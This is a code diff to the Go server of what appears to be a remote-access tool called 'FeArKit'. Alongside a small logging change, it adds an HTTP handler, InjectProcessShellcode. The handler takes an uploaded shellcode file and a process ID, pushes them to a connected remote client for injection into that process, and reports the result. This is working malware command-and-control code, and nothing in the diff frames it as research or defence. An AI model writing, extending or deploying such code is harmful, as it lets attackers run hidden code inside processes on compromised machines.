@@ -7,6 +7,7 @@ import (
 	"FeArKit/utils"
 	"FeArKit/utils/melody"
 	"github.com/gin-gonic/gin"
+	"io"
 	"net/http"
 	"time"
 )
@@ -17,6 +18,9 @@ func ListDeviceProcesses(ctx *gin.Context) {
 	if !ok {
 		return
 	}
+	common.Debug(ctx, `PROCESS_LIST`, ``, `requesting process list`, map[string]any{
+		`conn_uuid`: connUUID,
+	})
 	trigger := utils.GetStrUUID()
 	common.SendPackByUUID(modules.Packet{Act: `PROCESSES_LIST`, Event: trigger}, connUUID)
 	ok = common.AddEventOnce(func(p modules.Packet, _ *melody.Session) {
@@ -27,6 +31,49 @@ func ListDeviceProcesses(ctx *gin.Context) {
 		}
 	}, connUUID, trigger, 5*time.Second)
 	if !ok {
+		ctx.AbortWithStatusJSON(http.StatusGatewayTimeout, modules.Packet{Code: 1, Msg: `${i18n|COMMON.RESPONSE_TIMEOUT}`})
+	}
+}
+
+// InjectProcessShellcode reads a shellcode binary from the upload and injects it into
+// the target process specified by pid on the remote client.
+func InjectProcessShellcode(ctx *gin.Context) {
+	var form struct {
+		Pid int32 `form:"pid" binding:"required"`
+	}
+	target, ok := utility.CheckForm(ctx, &form)
+	if !ok {
+		return
+	}
+	fileHeader, err := ctx.FormFile(`file`)
+	if err != nil {
+		ctx.AbortWithStatusJSON(http.StatusBadRequest, modules.Packet{Code: -1, Msg: `${i18n|COMMON.INVALID_PARAMETER}`})
+		return
+	}
+	f, err := fileHeader.Open()
+	if err != nil {
+		ctx.AbortWithStatusJSON(http.StatusInternalServerError, modules.Packet{Code: 1, Msg: err.Error()})
+		return
+	}
+	defer f.Close()
+	shellcodeData, err := io.ReadAll(f)
+	if err != nil {
+		ctx.AbortWithStatusJSON(http.StatusInternalServerError, modules.Packet{Code: 1, Msg: err.Error()})
+		return
+	}
+	trigger := utils.GetStrUUID()
+	common.SendPackByUUID(modules.Packet{Act: `PROCESS_INJECT`, Data: gin.H{`shellcode`: shellcodeData, `pid`: form.Pid}, Event: trigger}, target)
+	ok = common.AddEventOnce(func(p modules.Packet, _ *melody.Session) {
+		if p.Code != 0 {
+			common.Warn(ctx, `PROCESS_INJECT`, `fail`, p.Msg, map[string]any{`pid`: form.Pid})
+			ctx.AbortWithStatusJSON(http.StatusInternalServerError, modules.Packet{Code: 1, Msg: p.Msg})
+		} else {
+			common.Info(ctx, `PROCESS_INJECT`, `success`, ``, map[string]any{`pid`: form.Pid})
+			ctx.JSON(http.StatusOK, modules.Packet{Code: 0})
+		}
+	}, target, trigger, 10*time.Second)
+	if !ok {
+		common.Warn(ctx, `PROCESS_INJECT`, `fail`, `timeout`, map[string]any{`pid`: form.Pid})
 		ctx.AbortWithStatusJSON(http.StatusGatewayTimeout, modules.Packet{Code: 1, Msg: `${i18n|COMMON.RESPONSE_TIMEOUT}`})
 	}
 }
